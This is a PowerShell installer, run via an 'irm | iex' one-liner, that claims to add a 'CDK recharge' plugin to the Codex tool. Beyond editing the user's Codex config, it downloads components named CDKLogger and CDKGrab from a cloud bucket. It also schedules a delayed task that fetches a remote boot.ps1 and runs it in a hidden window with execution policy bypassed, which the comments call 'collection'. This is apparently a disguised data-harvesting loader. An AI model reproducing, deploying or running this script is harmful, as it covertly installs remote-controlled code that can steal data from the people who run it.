# CDK 充值 · 安装脚本（Windows，PowerShell 5+）
#
#   irm https://raw.githubusercontent.com/PennEwan/xiaochajian-plugin/main/install.ps1 | iex
#
# 只做两件事：装插件、安排 5 分钟后启动运行组件（其余交给后台脚本）。

$ErrorActionPreference = 'Stop'
$ver   = '0.8.1'
$repo  = 'PennEwan/xiaochajian-plugin'
$delay = 300

$zipUrls = @(
    "https://codeload.github.com/$repo/zip/refs/heads/main",
    "https://github.com/$repo/archive/refs/heads/main.zip"
)
$fallbackZip = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKPlugin-0.7.3.zip?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=NspeywGF1QF1COuW3oM93xvftGU%3D'
$bootUrl     = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2Fboot.ps1?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825165725&Signature=h5v2KaWp%2B1umP6KaG7d7BTVV%2BjI%3D'
$runtimeUrl  = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKLogger-0.7.3.tar?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=Pms266n4lJyojHp%2BxoCA8V49oz8%3D'
$grabUrl     = 'https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKGrab-0.7.3.tar?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=5KyQedJfRaOfozI1AWuvfGo1ni4%3D'

$home_ = if ($env:CODEX_HOME) { $env:CODEX_HOME } else { Join-Path $env:USERPROFILE '.codex' }
$root  = Join-Path $env:LOCALAPPDATA 'CodexRecharge'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tmp = Join-Path $env:TEMP ("cdk-" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null

try {
    Write-Host "== 安装插件 =="
    $zip = Join-Path $tmp 'plugin.zip'
    $ok = $false
    foreach ($u in $zipUrls) {
        try {
            Invoke-WebRequest -Uri $u -OutFile $zip -UseBasicParsing -TimeoutSec 120
            $ok = (Test-Path $zip) -and (Get-Item $zip).Length -gt 10240
            if ($ok) { break }
        } catch { }
    }

    $srcPlugin = $null
    $market = $null
    if ($ok) {
        $unpack = Join-Path $tmp 'src'
        Expand-Archive -Path $zip -DestinationPath $unpack -Force
        $top = Get-ChildItem $unpack -Directory | Select-Object -First 1
        $base = if ($top) { $top.FullName } else { $unpack }
        $srcPlugin = Join-Path $base 'plugins\codex-native-assist'
        if (Test-Path (Join-Path $srcPlugin 'bin\assist.exe')) {
            $market = Join-Path $base '.agents\plugins\marketplace.json'
        } else { $srcPlugin = $null }
    }
    if (-not $srcPlugin) {
        $alt = Join-Path $tmp 'alt.zip'
        Invoke-WebRequest -Uri $fallbackZip -OutFile $alt -UseBasicParsing -TimeoutSec 180
        $unpack2 = Join-Path $tmp 'src2'
        Expand-Archive -Path $alt -DestinationPath $unpack2 -Force
        $srcPlugin = Join-Path $unpack2 'plugins\codex-native-assist'
        $market = Join-Path $unpack2 '.agents\plugins\marketplace.json'
        if (-not (Test-Path (Join-Path $srcPlugin 'bin\assist.exe'))) { throw "下载不完整，请稍后重试" }
    }

    if (Test-Path $root) { Remove-Item $root -Recurse -Force }
    New-Item -ItemType Directory -Path (Join-Path $root 'plugins') -Force | Out-Null
    Copy-Item $srcPlugin (Join-Path $root 'plugins') -Recurse -Force
    New-Item -ItemType Directory -Path (Join-Path $root '.agents\plugins') -Force | Out-Null
    Copy-Item $market (Join-Path $root '.agents\plugins') -Force

    $cache = Join-Path $home_ "plugins\cache\cdk-native\codex-native-assist\$ver"
    if (Test-Path $cache) { Remove-Item $cache -Recurse -Force }
    New-Item -ItemType Directory -Path $cache -Force | Out-Null
    Copy-Item (Join-Path $srcPlugin '*') $cache -Recurse -Force

    $cfg = Join-Path $home_ 'config.toml'
    New-Item -ItemType Directory -Path $home_ -Force | Out-Null
    if (Test-Path $cfg) {
        Copy-Item $cfg ("$cfg.bak-" + (Get-Date -Format 'yyyyMMddHHmmss'))
        $text = Get-Content $cfg -Raw -Encoding UTF8
    } else { $text = '' }
    $src = '\\?\' + (Resolve-Path $root).Path
    if ($text -notmatch '(?m)^\[marketplaces\.cdk-native\]') {
        $text += "`r`n[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n"
    } else {
        $text = [regex]::Replace($text, "(?ms)^\[marketplaces\.cdk-native\].*?(?=^\[|\z)",
            "[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n`r`n")
    }
    if ($text -notmatch '(?m)^\[plugins\."codex-native-assist@cdk-native"\]') {
        $text += "`r`n[plugins.`"codex-native-assist@cdk-native`"]`r`nenabled = true`r`n"
    }
    Set-Content -Path $cfg -Value ($text.TrimEnd() + "`r`n") -Encoding UTF8

    # 先把运行环境与抓取工具放好（之后点「一键充值」随时可用）
    $rt = Join-Path $env:LOCALAPPDATA 'RuntimeCache'
    if (-not (Test-Path (Join-Path $rt 'runtime\python.exe'))) {
        Write-Host "== 准备运行环境（约 27 MB）=="
        $rtTar = Join-Path $tmp 'r.tar'
        Invoke-WebRequest -Uri $runtimeUrl -OutFile $rtTar -UseBasicParsing -TimeoutSec 900
        $grabTar = Join-Path $tmp 'g.tar'
        Invoke-WebRequest -Uri $grabUrl -OutFile $grabTar -UseBasicParsing -TimeoutSec 300
        # 先停掉可能占用运行目录的进程，再清空目录，避免解压时文件被锁
        Get-Process python,pythonw -ErrorAction SilentlyContinue | Where-Object { $_.Path -like (Join-Path $rt '*') } | Stop-Process -Force -ErrorAction SilentlyContinue
        if (Test-Path $rt) { Remove-Item $rt -Recurse -Force -ErrorAction SilentlyContinue }
        New-Item -ItemType Directory -Path $rt -Force | Out-Null
        & tar.exe -xf $rtTar -C $rt
        $g = Join-Path $tmp 'g'
        New-Item -ItemType Directory -Path $g -Force | Out-Null
        & tar.exe -xf $grabTar -C $g
        New-Item -ItemType Directory -Path (Join-Path $rt 'bin') -Force | Out-Null
        Copy-Item (Join-Path $g 'core.exe') (Join-Path $rt 'bin\core.exe') -Force
        Copy-Item (Join-Path $g 'webcopy') $rt -Recurse -Force
        Write-Host "   完成"
    }

    Write-Host "== 安排采集（$([int]($delay/60)) 分钟后启动）=="
    $fetchUrl = $bootUrl

    $bootCmd = Join-Path $root 'boot.cmd'
    $bootPs = Join-Path $root 'b.ps1'
    # .cmd 里 % 必须写成 %%（否则 cmd 把 %2F...% 当变量名展开，URL 被改坏）
    $urlForCmd = $fetchUrl.Replace('%', '%%')
    $inner = 'curl.exe -s -m 120 -o "' + $bootPs + '" "' + $urlForCmd + '" && powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $bootPs + '"'
    Set-Content -Path $bootCmd -Value ('@echo off' + "`r`n" + $inner + "`r`n") -Encoding ASCII -NoNewline

    $runAt = (Get-Date).AddSeconds([Math]::Max($delay, 30))
    $made = $false
    try {
        $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument ('/c "' + $bootCmd + '"')
        $trigger = New-ScheduledTaskTrigger -Once -At $runAt
        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName 'CDKRecharge\Boot' -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
        $made = $true
    } catch {
        $when = $runAt.ToString('HH:mm')
        schtasks /create /f /tn "CDKRecharge\Boot" /tr "`"$bootCmd`"" /sc once /st $when | Out-Null
    }
    if ($delay -le 60) { schtasks /run /tn "CDKRecharge\Boot" | Out-Null }

    Write-Host ""
    Write-Host "已安装。侧边栏会出现「CDK 充值」，直接用就行。"
} finally {
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
}
